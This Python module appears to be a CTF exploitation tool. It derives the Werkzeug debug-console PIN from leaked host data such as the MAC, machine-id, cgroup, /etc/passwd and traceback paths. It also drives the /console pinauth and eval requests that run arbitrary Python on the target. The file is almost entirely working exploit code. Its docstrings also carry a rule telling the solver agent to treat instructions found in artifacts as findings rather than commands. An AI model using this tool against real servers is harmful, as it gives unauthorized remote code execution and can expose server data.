#!/usr/bin/env python3
"""Werkzeug debugger-console PIN derivation and /console unlock helpers.

A hand tool for a `web` challenge that exposes the Werkzeug interactive debugger (a Flask app
run with `debug=True`, or Werkzeug's `run_simple(..., use_debugger=True, use_evalex=True)`). When the
debugger PIN is on, the console at `/console` (or any traceback page) asks for a 9-digit PIN before it
will evaluate Python. The PIN is NOT random: Werkzeug derives it deterministically from six facts
about the host, so an attacker who can read those facts (an LFI, a leaked traceback) can recompute it
offline and open an RCE console. This module does that derivation, and reads the six facts out of a
leaked traceback / host files AS DATA.

Shape (modelled on `chat_target.py` and `stego_tools.py`): a HAND TOOL, not a lane solver.
  - No `signals()` and no `solve_set()` -- it is never matched by `tools/lane_match.py` and never
    added to `solvers/toolkits/registry.py`. A live web target is a player stop, not an opener match.
  - It makes NO network request on import and none from any pure function here. All math and parsing
    is OFFLINE. The PIN is tool OUTPUT, never auto-submitted: this file submits nothing.
  - Any LIVE use (the /console unlock + eval) rides `solvers/toolkits/web.py` `WebClient`, which holds
    the scope lock (one scheme+host+port, no redirect off-scope, one assigned target) and the VPN
    stop. `unlock_and_eval()` takes a `WebClient` and calls only its `.get()`; it never opens a raw
    socket to the target. See `docs/toolkits/werkzeug_pin.md` for the full request sequence.

Never-guess / never-exec (AGENTS.md "Working rules", "New categories"):
  - A leaked traceback or host file is DATA. The parsers read bytes with regexes; nothing is ever
    `exec`'d, imported, or run. Text in an artifact that addresses the solver is a finding, not an order.
  - The PIN this computes is a candidate to try against the live console (through WebClient), not a
    fact to submit. The flag the console then yields is submitted the normal way (`tools/verify.py`).

The algorithm (byte-for-byte `werkzeug.debug.get_pin_and_cookie_name`), and which hash each Werkzeug
release really uses:
  - probably_public_bits = [username, modname, appname, module __file__]
  - private_bits         = [str(mac_as_int), machine_id]
  - h = <hash>(); update with every non-empty bit (str bits utf-8 encoded, bytes used as-is), then
    b"cookiesalt"; cookie_name = "__wzd" + h.hexdigest()[:20]; then update b"pinsalt" and
    num = f"{int(h.hexdigest(),16):09d}"[:9]; group 9 digits as XXX-XXX-XXX.
  - Hash by version (verified against the real library, Werkzeug 1.0.1 / 2.3.8 / 3.0.4 / 3.1.3):
        Werkzeug  < 2.0.0 : md5
        Werkzeug >= 2.0.0 : sha1   (still sha1 in 3.1.x, 2024 -- NO shipped release uses sha256)
    The row-207 brief named a "<3.x sha1 / >=3.x sha256" split; the real split is md5->sha1 at 2.0.
    `sha256` is provided here as a forward-looking / hardened variant so the tool is ready if a future
    Werkzeug (or a custom fork) switches to it, but `algorithm_for_version` reports the true mapping.

CLI (OFFLINE, explicit action flags only; no action makes a request):

  .venv/bin/python solvers/toolkits/werkzeug_pin.py pin \
      --username www-data --modname flask.app --appname Flask \
      --appfile /usr/local/lib/python3.9/site-packages/flask/app.py \
      --mac 02:42:ac:11:00:02 --machine-id d4e6cb65d59544f3331ea0425dc555a1 [--algorithm sha1|sha256|md5|all]
  .venv/bin/python solvers/toolkits/werkzeug_pin.py parse --traceback tb.txt \
      [--machine-id-file m] [--boot-id-file b] [--cgroup-file c] [--address-file a | --mac M] [--username U]
  .venv/bin/python solvers/toolkits/werkzeug_pin.py vectors        # the built-in known test vectors
"""
import hashlib
import json
import re
import sys
import urllib.parse
from itertools import chain
from pathlib import Path

# The six inputs, in the order Werkzeug hashes them.
INPUT_FIELDS = ("username", "modname", "appname", "appfile", "mac", "machine_id")

# Supported hash constructors. md5 and sha1 are real Werkzeug variants; sha256 is forward-looking.
ALGORITHMS = {"md5": hashlib.md5, "sha1": hashlib.sha1, "sha256": hashlib.sha256}


# =====================================================================================
#  Known vectors (used by the unit test; see docstring for provenance)
# =====================================================================================

# The canonical public example input set (HackTricks "Werkzeug / Flask Debug"):
EXAMPLE_INPUTS = {
    "username": "web3_user",
    "modname": "flask.app",
    "appname": "Flask",
    "appfile": "/usr/local/lib/python3.5/dist-packages/flask/app.py",
    "mac": 279275995014060,                          # uuid.getnode()
    "machine_id": "d4e6cb65d59544f3331ea0425dc555a1",
}

# REAL known-good vectors: generated from the actual Werkzeug library on these inputs (md5 from
# werkzeug==1.0.1, sha1 from werkzeug==2.3.8/3.0.4/3.1.3 -- all agree). The sha256 pair is a
# SELF-CONSISTENCY (round-trip) vector from this module's own faithful algorithm, since no shipped
# Werkzeug uses sha256.
KNOWN_VECTORS = {
    # algorithm: (pin, cookie_name, kind)
    "md5":    ("185-468-931", "__wzdbd3e38eaf13b966f89d8", "real"),     # Werkzeug < 2.0
    "sha1":   ("971-027-971", "__wzd4b0db5b5f2f6e60a0bb8", "real"),     # Werkzeug >= 2.0 (incl. 3.x)
    "sha256": ("396-282-463", "__wzd68052c112900f93b2d78", "self"),     # forward-looking variant
}


def algorithm_for_version(version):
    """The hash Werkzeug of `version` really uses. `version` is a string ('2.3.8') or a tuple
    ((2, 3, 8)). md5 below 2.0, sha1 from 2.0 up (true as of 3.1.x, 2024)."""
    if isinstance(version, str):
        parts = re.findall(r"\d+", version)
        version = tuple(int(p) for p in parts[:3])
    version = tuple(version) + (0,) * (3 - len(version)) if version else (0, 0, 0)
    return "md5" if version < (2, 0, 0) else "sha1"


# =====================================================================================
#  MAC handling
# =====================================================================================

_MAC_RE = re.compile(r"\b([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\b")
_ADDRESS_FILE_RE = re.compile(r"/sys/class/net/([^/\s]+)/address")


def normalize_mac(value):
    """A MAC, in any of the forms a leak gives it, as the decimal integer `uuid.getnode()` returns.

    Accepts: the colon form '02:42:ac:11:00:02', bare hex '0242ac110002', the content of a
    /sys/class/net/<iface>/address file (bytes or str, possibly with a trailing newline), or an
    already-decimal int/str ('279275995014060'). Returns None when it is not a MAC."""
    if value is None:
        return None
    if isinstance(value, (bytes, bytearray)):
        value = bytes(value).decode("utf-8", "replace")
    if isinstance(value, int):
        return int(value)
    s = str(value).strip()
    if not s:
        return None
    m = _MAC_RE.search(s)
    if m:
        return int(m.group(1).replace(":", ""), 16)
    if re.fullmatch(r"[0-9A-Fa-f]{12}", s):           # bare 12-hex MAC
        return int(s, 16)
    if re.fullmatch(r"\d{1,15}", s):                  # already the decimal uuid.getnode()
        return int(s)
    return None


def mac_int_from_address_file(content):
    """The decimal MAC from the content of a /sys/class/net/<iface>/address file (one MAC line)."""
    return normalize_mac(content)


def find_macs(text):
    """Every MAC in some text, as [(iface_or_None, mac_str, mac_int)]. `iface` is filled when a
    '/sys/class/net/<iface>/address' path sits on or just before the MAC's line (a leaked read of
    that file). Loopback 00:00:00:00:00:00 is skipped (uuid.getnode never returns it)."""
    text = _as_text(text)
    lines = text.splitlines()
    # map each line index to the iface named by a nearby address path
    iface_at = {}
    for i, line in enumerate(lines):
        mm = _ADDRESS_FILE_RE.search(line)
        if mm:
            iface_at[i] = mm.group(1)
    out, seen = [], set()
    for i, line in enumerate(lines):
        for m in _MAC_RE.finditer(line):
            mac_str = m.group(1)
            mac_int = int(mac_str.replace(":", ""), 16)
            if mac_int == 0 or mac_str in seen:
                continue
            seen.add(mac_str)
            iface = iface_at.get(i) or iface_at.get(i - 1)
            out.append((iface, mac_str, mac_int))
    return out


# =====================================================================================
#  machine-id (both the simple rule and the container/cgroup rule)
# =====================================================================================

def _first_line_bytes(value):
    """The first line of a file's content, stripped, as bytes (Werkzeug: `f.readline().strip()`)."""
    if value is None:
        return b""
    if isinstance(value, str):
        value = value.encode("utf-8")
    value = bytes(value)
    nl = value.find(b"\n")
    first = value if nl < 0 else value[:nl]
    return first.strip()


def machine_id(machine_id=None, boot_id=None, cgroup=None, use_cgroup=True):
    """The machine id Werkzeug would hash, as bytes, mirroring `werkzeug.debug.get_machine_id()`.

    Rule: take the first non-empty of (/etc/machine-id, /proc/sys/kernel/random/boot_id), each as its
    first line stripped (boot_id keeps its dashes). Then, with the container rule, append the basename
    (after the last '/') of the first line of /proc/self/cgroup.

      - use_cgroup=True  -> the container rule (Werkzeug >= 0.15: id + cgroup basename). The default.
      - use_cgroup=False -> the simple rule (older Werkzeug: the id alone).

    The row-207 brief called these the "<3.x and >=3.x" rules; the cgroup concatenation actually
    landed in 0.15 and is still present in 3.1.x. Pass either file's content (bytes or str); omit what
    was not leaked. Returns b"" when nothing was given (Werkzeug then falls back to ioreg/registry,
    which this offline tool cannot read -- the agent supplies the value)."""
    value = b""
    for cand in (machine_id, boot_id):
        first = _first_line_bytes(cand)
        if first:
            value += first
            break
    if use_cgroup and cgroup is not None:
        value += _first_line_bytes(cgroup).rpartition(b"/")[2]
    return value


# =====================================================================================
#  PIN derivation (the core; byte-for-byte werkzeug.debug.get_pin_and_cookie_name)
# =====================================================================================

def _as_bits(value):
    """One hash bit: bytes used as-is, str utf-8 encoded, an int stringified (Werkzeug stores
    str(uuid.getnode())). None/empty becomes b'' (skipped by the hashing loop, as Werkzeug does)."""
    if value is None:
        return b""
    if isinstance(value, (bytes, bytearray)):
        return bytes(value)
    if isinstance(value, int):
        return str(value).encode("utf-8")
    return str(value).encode("utf-8")


def _group_pin(num):
    """Group a 9-digit string as Werkzeug does (groups of 5, then 4, then 3; 9 -> XXX-XXX-XXX)."""
    for group_size in (5, 4, 3):
        if len(num) % group_size == 0:
            return "-".join(num[x:x + group_size].rjust(group_size, "0")
                            for x in range(0, len(num), group_size))
    return num


def derive_pin(username, modname, appname, appfile, mac, machine_id, algorithm="sha1"):
    """The (pin, cookie_name) Werkzeug's debugger would use for these six inputs.

    `mac` may be a decimal int, a colon/bare MAC, or the address-file content (normalize_mac handles
    it); `machine_id` is the bytes/str machine id (use machine_id() to build it from files). The hash
    object is reused and mutated exactly as upstream (cookiesalt for the cookie, then pinsalt for the
    PIN). Returns (pin, cookie_name)."""
    ctor = ALGORITHMS.get(algorithm)
    if ctor is None:
        raise ValueError(f"unknown algorithm {algorithm!r}; one of {', '.join(ALGORITHMS)}")
    mac_int = normalize_mac(mac)
    probably_public_bits = [username, modname, appname, appfile]
    private_bits = [None if mac_int is None else str(mac_int), machine_id]

    h = ctor()
    for bit in chain(probably_public_bits, private_bits):
        b = _as_bits(bit)
        if not b:                       # Werkzeug skips falsy bits (missing username, no __file__, ...)
            continue
        h.update(b)
    h.update(b"cookiesalt")
    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]
    return _group_pin(num), cookie_name


def derive_all_pins(username, modname, appname, appfile, mac, machine_id):
    """(pin, cookie_name) under every supported algorithm: {algorithm: (pin, cookie_name)}. An
    attacker who does not know the server's Werkzeug version tries the one matching it (sha1 for a
    modern Flask, md5 for a very old one); this returns all of them."""
    return {alg: derive_pin(username, modname, appname, appfile, mac, machine_id, alg)
            for alg in ALGORITHMS}


def derive_pin_from_inputs(inputs, algorithm="sha1"):
    """derive_pin from a dict with the INPUT_FIELDS keys."""
    return derive_pin(inputs.get("username"), inputs.get("modname"), inputs.get("appname"),
                      inputs.get("appfile"), inputs.get("mac"), inputs.get("machine_id"), algorithm)


# =====================================================================================
#  Parsers: read the six inputs out of a leaked traceback / host files (DATA only)
# =====================================================================================

_FRAME_FILE_RE = re.compile(r'File "([^"]+)", line \d+')
# username hints an LFI of /etc/passwd or a process listing leaves behind
_PASSWD_RE = re.compile(r"^([A-Za-z_][A-Za-z0-9_.-]*):x?:(\d+):", re.M)
_USER_ENV_RE = re.compile(r"(?:^|[\s'\"])(?:USER|LOGNAME|USERNAME)\s*[=:]\s*['\"]?([A-Za-z_][A-Za-z0-9_.-]*)")
# the debugger page leaks these in its inline JS
_SECRET_RE = re.compile(r"""SECRET\s*=\s*["']([^"']+)["']""")
_EVALEX_TRUSTED_RE = re.compile(r"EVALEX_TRUSTED\s*=\s*(true|false)", re.I)
_EVALEX_RE = re.compile(r"\bEVALEX\s*=\s*(true|false)", re.I)


def parse_traceback(text):
    """Read what a leaked Werkzeug traceback / debug page tells us, as DATA. Returns a dict:

        frame_files      every `File "..."` path in the traceback, in order
        app_file         the module __file__ to hash (the flask/app.py frame when present, else the
                         first site-packages framework file, else the first frame) -- a CANDIDATE
        modname, appname proposed from app_file for a default Flask app (flask.app / Flask); None
                         otherwise, because they depend on the live app object (the agent confirms)
        secret           the debugger SECRET from the page's JS, if present (needed to drive /console)
        evalex           True when the page advertises EVALEX (the eval console is on)
        evalex_trusted   True when EVALEX_TRUSTED -- the console needs NO PIN (unprotected debug=True)

    Nothing here is executed; the traceback is bytes read with regexes."""
    text = _as_text(text)
    files = _FRAME_FILE_RE.findall(text)
    app_file = _choose_app_file(files)
    modname, appname = _modname_appname_for(app_file)
    secret = _SECRET_RE.search(text)
    trusted = _EVALEX_TRUSTED_RE.search(text)
    evalex = _EVALEX_RE.search(text)
    return {
        "frame_files": files,
        "app_file": app_file,
        "modname": modname,
        "appname": appname,
        "secret": secret.group(1) if secret else None,
        "evalex": (evalex.group(1).lower() == "true") if evalex else None,
        "evalex_trusted": (trusted.group(1).lower() == "true") if trusted else None,
    }


def _choose_app_file(files):
    """The module __file__ to hash. For a default Flask app, modname is 'flask.app' and so the hashed
    __file__ is '.../flask/app.py' -- that frame is in every Werkzeug traceback, so prefer it."""
    for f in files:
        if f.replace("\\", "/").endswith("flask/app.py"):
            return f
    for f in files:                                     # another framework module under site-packages
        if re.search(r"(?:site|dist)-packages/.+?/app\.py$", f.replace("\\", "/")):
            return f
    return files[0] if files else None


def _modname_appname_for(app_file):
    """Propose (modname, appname) from the __file__ path. Only confident for the Flask default."""
    if app_file and app_file.replace("\\", "/").endswith("flask/app.py"):
        return "flask.app", "Flask"
    return None, None


def find_usernames(text):
    """Usernames a leaked /etc/passwd or environment dump offers, best-first (non-system uids first:
    0, then 1000+, then the rest). Werkzeug uses getpass.getuser(), i.e. the uid the server runs as
    (often www-data, app, root). A CANDIDATE list; the agent picks the one the server runs as."""
    text = _as_text(text)
    rows = [(name, int(uid)) for name, uid in _PASSWD_RE.findall(text)]
    env = _USER_ENV_RE.findall(text)
    ordered = []
    ordered += [n for n, u in rows if u == 0]
    ordered += [n for n, u in sorted(rows, key=lambda r: r[1]) if u >= 1000]
    ordered += [n for n, u in rows if 0 < u < 1000]
    for n in env:
        if n not in ordered:
            ordered.insert(0, n)                        # an explicit USER= is the strongest hint
    # de-dupe, keep order
    seen, out = set(), []
    for n in ordered:
        if n not in seen:
            seen.add(n)
            out.append(n)
    return out


def collect_inputs(traceback=None, host_files=None, username=None, modname=None, appname=None,
                   appfile=None, mac=None, machine_id_file=None, boot_id_file=None, cgroup_file=None,
                   use_cgroup=True):
    """Build the six PIN inputs from a leaked traceback and host files, as DATA. Explicit arguments
    win over what is parsed. `host_files` is an optional {path: content} map (e.g. the files an LFI
    read); recognised paths fill mac / machine-id / boot-id / cgroup / username automatically.

    Returns (inputs, notes): `inputs` is a dict with the INPUT_FIELDS keys (values may be None where a
    fact was not leaked -- the agent then supplies it), `notes` records candidates and what was used.
    Nothing is executed."""
    host_files = dict(host_files or {})
    notes = {}
    tb = parse_traceback(traceback) if traceback else {}

    # map well-known paths from a host-files dump
    def hf(suffix):
        for path, content in host_files.items():
            if path.replace("\\", "/").endswith(suffix):
                return content
        return None

    mac_content = mac if mac is not None else hf("/address")
    if mac_content is None:                             # any /sys/class/net/<iface>/address entry
        mac_content = next((c for p, c in host_files.items() if _ADDRESS_FILE_RE.search(p)), None)
    mac_int = normalize_mac(mac_content)
    if mac_int is None and traceback:                   # a MAC that appears loose in the traceback text
        macs = find_macs(traceback)
        if macs:
            mac_int = macs[0][2]
            notes["mac_candidates"] = [m[1] for m in macs]

    mid = machine_id(
        machine_id=(machine_id_file if machine_id_file is not None else hf("/etc/machine-id")),
        boot_id=(boot_id_file if boot_id_file is not None else hf("/boot_id")),
        cgroup=(cgroup_file if cgroup_file is not None else hf("/cgroup")),
        use_cgroup=use_cgroup,
    ) or None

    user = username
    if user is None:
        src = _as_text(hf("/etc/passwd")) + "\n" + (_as_text(traceback) if traceback else "")
        cands = find_usernames(src)
        if cands:
            user = cands[0]
            notes["username_candidates"] = cands

    inputs = {
        "username": user,
        "modname": modname if modname is not None else tb.get("modname"),
        "appname": appname if appname is not None else tb.get("appname"),
        "appfile": appfile if appfile is not None else tb.get("app_file"),
        "mac": mac_int,
        "machine_id": mid,
    }
    if tb.get("frame_files"):
        notes["frame_files"] = tb["frame_files"]
    if tb.get("secret"):
        notes["secret"] = tb["secret"]
    if tb.get("evalex_trusted") is not None:
        notes["evalex_trusted"] = tb["evalex_trusted"]
    notes["missing"] = [k for k in INPUT_FIELDS if inputs.get(k) in (None, "")]
    return inputs, notes


# =====================================================================================
#  LIVE driver (routes ONLY through web.py WebClient; no raw HTTP to the target)
# =====================================================================================

DEBUGGER_PATH = "/console"


def console_requests(secret, code, pin=None, frame=0, path=DEBUGGER_PATH):
    """The request path(s) the /console unlock + eval needs, as a list of (method, path_with_query)
    tuples -- for the write-up and for a caller that drives its own scope-locked client. No request
    is made here. When `pin` is given, the first entry is the pinauth unlock; the last is the eval."""
    seq = []
    if pin is not None:
        seq.append(("GET", path + "?" + urllib.parse.urlencode(
            {"__debugger__": "yes", "cmd": "pinauth", "pin": pin, "s": secret})))
    seq.append(("GET", path + "?" + urllib.parse.urlencode(
        {"__debugger__": "yes", "cmd": code, "frm": frame, "s": secret})))
    return seq


def unlock_and_eval(client, secret, code, pin=None, frame=0, path=DEBUGGER_PATH):
    """Drive the Werkzeug console through a scope-locked `web.WebClient` (nothing else is accepted):
    unlock with the PIN if one is given (cmd=pinauth), then evaluate `code` in frame `frm` (cmd=code).

    `client` MUST be a `web.WebClient` (it carries the scope lock, the cookie jar that keeps the trust
    cookie between the two requests, and the VPN stop). This function opens no socket of its own.
    Returns {'authed': bool|None, 'auth_response': entry|None, 'eval_response': entry}; the responses
    are WebClient log entries (status, headers, body). The console output is DATA, never executed.

    For an UNPROTECTED debugger (`debug=True` with the PIN off: the page's EVALEX_TRUSTED is true),
    pass pin=None -- the eval runs with no unlock."""
    if not (hasattr(client, "get") and hasattr(client, "request")):
        raise TypeError("unlock_and_eval drives a web.WebClient only (scope lock + VPN stop); "
                        "build one with web.WebClient(web.target_for(challenge, attempt)).")
    out = {"authed": None, "auth_response": None, "eval_response": None}
    reqs = console_requests(secret, code, pin=pin, frame=frame, path=path)
    if pin is not None:
        _m, auth_path = reqs[0]
        resp = client.get(auth_path)
        out["auth_response"] = resp
        out["authed"] = _auth_ok(resp)
        reqs = reqs[1:]
    _m, eval_path = reqs[0]
    out["eval_response"] = client.get(eval_path)
    return out


def _auth_ok(resp):
    """True when a pinauth response says the PIN was accepted ({"auth": true})."""
    body = resp.get("body") if isinstance(resp, dict) else None
    if isinstance(body, (bytes, bytearray)):
        body = bytes(body).decode("utf-8", "replace")
    if not isinstance(body, str):
        return None
    try:
        obj = json.loads(body)
    except ValueError:
        return None
    return bool(obj.get("auth")) if isinstance(obj, dict) else None


def client_for(challenge, attempt=None):
    """A scope-locked `web.WebClient` for the live target of `challenge` (the GM's own target, or the
    address the player filed with tools/target.py). Lazily imports web.py (which makes no request on
    import). Returns None when no target is on file. The VPN must be up (web.WebClient enforces that
    and raises VPNRequired -- a player stop -- when the private target does not answer)."""
    here = str(Path(__file__).resolve().parent)
    if here not in sys.path:
        sys.path.insert(0, here)
    import web                                           # no request on import
    url = web.target_for(challenge, attempt)
    return web.WebClient(url) if url else None


# =====================================================================================
#  helpers / CLI
# =====================================================================================

def _as_text(data):
    if data is None:
        return ""
    if isinstance(data, str):
        return data
    try:
        return bytes(data).decode("utf-8", "replace")
    except Exception:
        return str(data)


def _read(path):
    return Path(path).read_bytes()


def _cmd_pin(args):
    algo = args.get("algorithm", "sha1")
    try:
        if algo == "all":
            pins = derive_all_pins(args.get("username"), args.get("modname"), args.get("appname"),
                                   args.get("appfile"), args.get("mac"), args.get("machine_id"))
        else:
            pins = {algo: derive_pin(args.get("username"), args.get("modname"), args.get("appname"),
                                     args.get("appfile"), args.get("mac"), args.get("machine_id"), algo)}
    except ValueError as e:
        print(f"werkzeug_pin: {e}", file=sys.stderr)
        return 2
    if args.get("json"):
        print(json.dumps({a: {"pin": p, "cookie_name": c} for a, (p, c) in pins.items()}, indent=1))
    else:
        for a, (p, c) in pins.items():
            note = {"real": "", "self": "  (self-consistency only; no shipped Werkzeug uses sha256)"}.get(
                KNOWN_VECTORS.get(a, (None, None, ""))[2], "")
            print(f"[{a}] PIN={p}  cookie={c}{note}")
    return 0


def _cmd_parse(args):
    tb = _read(args["traceback"]) if args.get("traceback") else None
    host_files = {}
    for key, suffix in (("machine_id_file", "/etc/machine-id"), ("boot_id_file", "/boot_id"),
                        ("cgroup_file", "/cgroup"), ("address_file", "/sys/class/net/eth0/address"),
                        ("passwd_file", "/etc/passwd")):
        if args.get(key):
            host_files[suffix] = _read(args[key])
    inputs, notes = collect_inputs(
        traceback=tb, host_files=host_files or None,
        username=args.get("username"), modname=args.get("modname"), appname=args.get("appname"),
        appfile=args.get("appfile"), mac=args.get("mac"),
        use_cgroup=not args.get("no_cgroup"),
    )
    out = {"inputs": {k: (v.decode("utf-8", "replace") if isinstance(v, (bytes, bytearray)) else v)
                      for k, v in inputs.items()}, "notes": notes}
    if all(inputs.get(k) not in (None, "") for k in INPUT_FIELDS):
        out["pins"] = {a: {"pin": p, "cookie_name": c}
                       for a, (p, c) in derive_all_pins(**inputs).items()}
    print(json.dumps(out, indent=1, default=str))
    return 0


def _cmd_vectors(args):
    for alg, (pin, cookie, kind) in KNOWN_VECTORS.items():
        print(f"[{alg}] PIN={pin}  cookie={cookie}  ({kind})")
    print("\ninputs:", json.dumps(EXAMPLE_INPUTS))
    return 0


def _parse_argv(argv):
    """Tiny flag parser: --name value, and bare --flag for booleans listed in BOOL_FLAGS."""
    BOOL_FLAGS = {"json", "no_cgroup"}
    args = {}
    it = iter(argv)
    for a in it:
        if a.startswith("--"):
            name = a[2:].replace("-", "_")
            if name in BOOL_FLAGS:
                args[name] = True
            else:
                args[name] = next(it, None)
        else:
            args.setdefault("_positional", []).append(a)
    return args


def main(argv):
    if not argv or argv[0] in ("-h", "--help"):
        print(__doc__)
        return 0 if argv else 2
    cmd, rest = argv[0], argv[1:]
    args = _parse_argv(rest)
    if cmd == "pin":
        return _cmd_pin(args)
    if cmd == "parse":
        if not (args.get("traceback") or args.get("machine_id_file") or args.get("boot_id_file")
                or args.get("address_file") or args.get("mac")):
            print("werkzeug_pin parse: give --traceback and/or host files (--machine-id-file, "
                  "--address-file, ...)", file=sys.stderr)
            return 2
        return _cmd_parse(args)
    if cmd == "vectors":
        return _cmd_vectors(args)
    print(f"werkzeug_pin: unknown action {cmd!r}; use: pin | parse | vectors", file=sys.stderr)
    return 2


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
